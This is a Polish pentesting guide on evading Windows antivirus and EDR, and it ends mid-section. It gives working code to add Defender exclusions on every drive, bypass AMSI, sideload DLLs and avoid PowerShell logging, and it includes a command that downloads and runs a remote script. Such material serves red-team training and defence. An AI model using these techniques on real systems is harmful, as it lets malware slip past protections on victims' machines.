# Obejście programu antywirusowego (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została początkowo napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie zatrzymujące działanie Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące działanie Windows Defender poprzez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

### Instalatorowy wabik UAC przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod game cheats często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień**, a dopiero potem neutralizują Defendera. Przebieg jest prosty:

1. Sprawdź, czy kontekst ma uprawnienia administratora, używając `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako standardowy użytkownik.
2. Natychmiast uruchom ponownie sam siebie z użyciem czasownika `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując oryginalny wiersz poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary i tak sądzą, że instalują „cracked” software, więc monit jest zazwyczaj akceptowany, dając malware uprawnienia potrzebne do zmiany policy Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące każdą literę dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują luki w ochronie Defendera zamiast całkowicie wyłączać usługę. Loader najpierw kończy działanie watchdoga GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co każdy profil użytkownika, katalog systemowy i dysk wymienny staje się niemożliwy do przeskanowania:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Najważniejsze obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony w dowolnym miejscu na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest działaniem przyszłościowym — attackerzy zachowują możliwość późniejszego ładowania unsigned drivers bez ponownego ingerowania w Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal zgłaszają „antivirus active”, mimo że inspekcja w czasie rzeczywistym nigdy nie obejmuje tych ścieżek.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Obecnie AVs używają różnych metod sprawdzania, czy plik jest malicious, czy nie: static detection, dynamic analysis oraz, w przypadku bardziej zaawansowanych EDRs, behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych malicious strings lub tablic bajtów w binary albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, digital signatures, ikony, checksum itd.). Oznacza to, że korzystanie ze znanych public tools może ułatwić wykrycie, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako malicious. Istnieje kilka sposobów na obejście tego rodzaju detection:

- **Encryption**

Jeśli zaszyfrujesz binary, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować pewnego rodzaju loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić niektóre strings w binary albo skrypcie, aby przeszedł przez AV, ale w zależności od tego, co próbujesz obfuscate, może to być czasochłonne.

- **Custom tooling**

Jeśli opracujesz własne tools, nie będą istniały żadne znane bad signatures, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie pod kątem static detection w Windows Defenderze jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie zasadniczo dzieli plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno, dzięki czemu może dokładnie wskazać, które strings lub bytes w twoim binary zostały oznaczone.

Gorąco polecam zapoznanie się z tą [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznemu AV Evasion.

### **Dynamic analysis**

Dynamic analysis ma miejsce, gdy AV uruchamia twój binary w sandboxie i obserwuje malicious activity (np. próbę odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itd.). Ta część może być nieco trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboxy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na obejście dynamic analysis AV. AVs mają bardzo mało czasu na skanowanie plików, aby nie przerywać pracy użytkownika, więc zastosowanie długiego sleep może zakłócić analizę binary. Problem polega na tym, że wiele AV sandboxes może po prostu pominąć sleep, zależnie od sposobu jego implementacji.
- **Checking machine's resources** Sandboxes zwykle mają do dyspozycji bardzo ograniczone zasoby (np. < 2GB RAM), ponieważ w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz być tutaj również bardzo kreatywny, na przykład sprawdzając temperaturę CPU albo nawet prędkość wentylatorów — nie wszystko zostanie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego workstation jest dołączony do domeny „contoso.local”, możesz sprawdzić domenę komputera, aby zobaczyć, czy odpowiada określonej przez ciebie domenie. Jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że computername w Microsoft Defender's Sandbox to HAL9TH, więc przed detonation możesz sprawdzić nazwę komputera w swoim malware. Jeśli nazwa odpowiada HAL9TH, oznacza to, że znajdujesz się wewnątrz defender's sandbox, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Oto kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących działania przeciwko Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak wspomnieliśmy wcześniej w tym poście, **public tools** prędzej czy później **zostaną wykryte**, więc powinieneś zadać sobie następujące pytanie:

Na przykład, jeśli chcesz wykonać dump LSASS, **czy naprawdę musisz używać mimikatz**? A może mógłbyś użyć innego, mniej znanego projektu, który również wykonuje dump LSASS?

Prawdopodobnie właściwa jest druga opcja. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z — jeśli nie najbardziej — oznaczonych przez AVs i EDRs malware. Sam projekt jest świetny, ale jednocześnie praca z nim w celu ominięcia AVs to koszmar, więc po prostu szukaj alternatyw dla tego, co próbujesz osiągnąć.

> [!TIP]
> Podczas modyfikowania payloads w celu evasion upewnij się, że **wyłączysz automatic sample submission** w defenderze, i proszę, naprawdę **NIE UPLOADUJ DO VIRUSTOTAL**, jeśli twoim celem jest długoterminowe osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatic sample submission i testuj go tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Zawsze, gdy jest to możliwe, **priorytetowo traktuj używanie DLLs w celu evasion**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane** i analizowane, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie detection (oczywiście jeśli twój payload może działać jako DLL).

Jak widzimy na tym obrazie, DLL Payload z Havoc ma detection rate 4/26 w antiscan.me, podczas gdy EXE payload ma detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me zwykłego Havoc EXE payload ze zwykłym Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka tricks, których możesz użyć z plikami DLL, aby osiągnąć znacznie większy stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając obok siebie zarówno victim application, jak i malicious payload(s).

Programy podatne na DLL Sideloading możesz sprawdzić za pomocą [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking znajdujących się w „C:\Program Files\\” oraz pliki DLL, które próbują załadować.

Zdecydowanie zalecam, abyś **samodzielnie wyszukał programy podatne na DLL Hijacking/Sideloading**. Ta technika, odpowiednio wykonana, jest dość stealthy, ale jeśli użyjesz publicznie znanych programów podatnych na DLL Sideloading, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, którą program oczekuje załadować, nie spowoduje załadowania payloadu, ponieważ program oczekuje obecności określonych funkcji wewnątrz tej biblioteki DLL. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z proxy (i złośliwej) biblioteki DLL do oryginalnej biblioteki DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie dostarczy nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną bibliotekę DLL ze zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można uznać to za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Zdecydowanie zalecam**, aby obejrzeć [twitch VOD S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading, a także [wideo ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych przez nas zagadnieniach.

### Nadużywanie Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości „forwarders”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy caller rozwiązuje eksport, Windows loader:

- Załaduje `TargetDll`, jeśli nie została jeszcze załadowana
- Rozwiąże `TargetFunc` z tego modułu

Najważniejsze zachowania, które należy zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, zostanie dostarczona z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego forward resolution.

Umożliwia to pośredni primitive sideloadingu: znajdź podpisaną DLL eksportującą funkcję przekierowaną do nazwy modułu niebędącego KnownDLL, a następnie umieść tę podpisaną DLL razem z kontrolowaną przez attackera DLL o nazwie dokładnie takiej jak przekierowany moduł docelowy. Gdy forwarded export zostanie wywołany, loader rozwiąże forward i załaduje Twoją DLL z tego samego katalogu, wykonując `DllMain`.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwana zgodnie ze standardową kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy do wykonania kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Uruchom przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące huntingu:
- Skup się na forwarded exports, w których docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczać forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły dotyczące wykrywania/ochrony:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane biblioteki DLL ze ścieżek niesystemowych, a następnie ładujące elementy spoza KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → niesystemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i blokuj możliwość zapisu oraz wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w sposób zapewniający skrytość.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls i rozwiązywanie SSN (SysWhispers4)

EDR-y często umieszczają **inline hooks w trybie użytkownika** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować **bezpośrednie** lub **pośrednie** stuby syscall, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania przechwyconego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: emituje instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez trafienia do eksportu `ntdll`).
- **Indirect**: wykonuje skok do istniejącego gadżetu `syscall` wewnątrz `ntdll`, dzięki czemu przejście do jądra wygląda tak, jakby pochodziło z `ntdll` (przydatne w evasion heurystycznym); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unika osadzania statycznej sekwencji opcode `0F 05` na dysku; rozwiązuje sekwencję syscall w czasie działania.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (VA sort)**: wnioskuje SSN przez sortowanie stubów syscall według adresu wirtualnego zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: mapuje czysty `\KnownDlls\ntdll.dll`, odczytuje SSN z jego `.text`, a następnie usuwa mapowanie (omija wszystkie hooki znajdujące się w pamięci).
- **RecycledGate**: łączy wnioskowanie SSN na podstawie posortowanych VA z walidacją opcode, gdy stub jest czysty; w przypadku hooka wraca do wnioskowania na podstawie VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w czasie działania, bez parsowania zahookowanych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został utworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV były w stanie skanować wyłącznie **pliki na dysku**, więc jeśli udało się w jakiś sposób wykonać payloady **bezpośrednio w pamięci**, AV nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows:

- User Account Control, czyli UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Umożliwia rozwiązaniom antywirusowym inspekcję zachowania skryptów poprzez udostępnianie zawartości skryptów w formie, która jest jednocześnie niezaszyfrowana i nieobfuskowana.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje prefiks `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest skanowany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do ładowania wykonania w pamięci. Dlatego w przypadku wykonywania w pamięci zaleca się używanie niższych wersji .NET (takich jak 4.7.2 lub starszych), jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie detekcji statycznych, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie detekcji.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw, więc obfuscation może być złym rozwiązaniem, zależnie od sposobu jej wykonania. Sprawia to, że obejście AMSI nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych i problem znika, więc zależy to od tego, jak wiele elementów zostało oflagowanych.

- **AMSI Bypass**

Ponieważ AMSI jest implementowany poprzez załadowanie biblioteki DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo ingerować w jego działanie nawet jako użytkownik bez uprzywilejowanych uprawnień. Z powodu tej wady w implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) spowoduje, że dla bieżącego procesu nie zostanie zainicjowane skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę mającą zapobiegać szerszemu wykorzystaniu tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby sprawić, że AMSI stało się bezużyteczne dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, dlatego konieczna jest jej modyfikacja, aby można było użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że prawdopodobnie zostanie to oznaczone, gdy ten post zostanie opublikowany, więc nie powinieneś publikować żadnego kodu, jeśli planujesz pozostać niewykrytym.

**Memory Patching**

Technika ta została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) oraz nadpisaniu jej instrukcjami nakazującymi zwrócenie kodu E_INVALIDARG. W ten sposób wynik właściwego skanowania będzie wynosił 0, co zostanie zinterpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje również wiele innych technik używanych do bypassowania AMSI w powershell — więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz w [**tym repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka bypassem jest umieszczenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skany.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript oraz niestandardowych loaderach (w przypadku wszystkiego, co w innym razie załadowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów wiersza poleceń.
- Stosowane w loaderach uruchamianych za pośrednictwem LOLBins (np. `regsvr32` wywołującego `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do ominięcia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do ominięcia AMSI, który unika wykrywania przez sygnatury dzięki losowym nazwom funkcji definiowanych przez użytkownika, zmiennym i wyrażeniom znakowym oraz stosuje losową wielkość liter w słowach kluczowych PowerShell, aby uniknąć wykrywania przez sygnatury.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI można znaleźć w repozytorium **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj wersji 2 Powershell**
Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, dzięki czemu możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz zrobić to:
```bash
powershell.exe -version 2
```
## PS Logging

Rejestrowanie PowerShell to funkcja umożliwiająca logowanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do celów audytowych i diagnostycznych, ale może również stanowić **problem dla attackerów, którzy chcą uniknąć wykrycia**.

Aby ominąć rejestrowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz PowerShell Transcription i Module Logging**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić za pomocą: `powershell.exe -version 2`
- **Użyj unmanaged sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (podejście używane przez `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani wszystkich innych zabezpieczeń PowerShell; zakres ochrony zależy od runtime'u i implementacji hosta.


## Obfuscation

> [!TIP]
> Kilka technik obfuscation opiera się na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrywanie przez AV i EDR. Zachowaj ostrożność i rozważ stosowanie szyfrowania tylko do określonych sekcji kodu, które są wrażliwe lub muszą zostać ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizowania malware korzystającego z ConfuserEx 2 (lub komercyjnych forków) często można napotkać kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca kod IL zbliżony do oryginalnego**, który następnie można zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usuwanie anti-tampering – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je wewnątrz statycznego konstruktora (`<Module>.cctor`) *modułu*. Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać oczyszczone assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Dane wyjściowe zawierają 6 parametrów anti-tampering (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskiwanie symboli / control-flow – przekaż *oczyszczony* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:  
• `-p crx` – wybiera profil ConfuserEx 2  
• de4dot cofnie control-flow flattening, przywróci oryginalne namespace'y, klasy i nazwy zmiennych oraz odszyfruje stałe łańcuchy znaków.

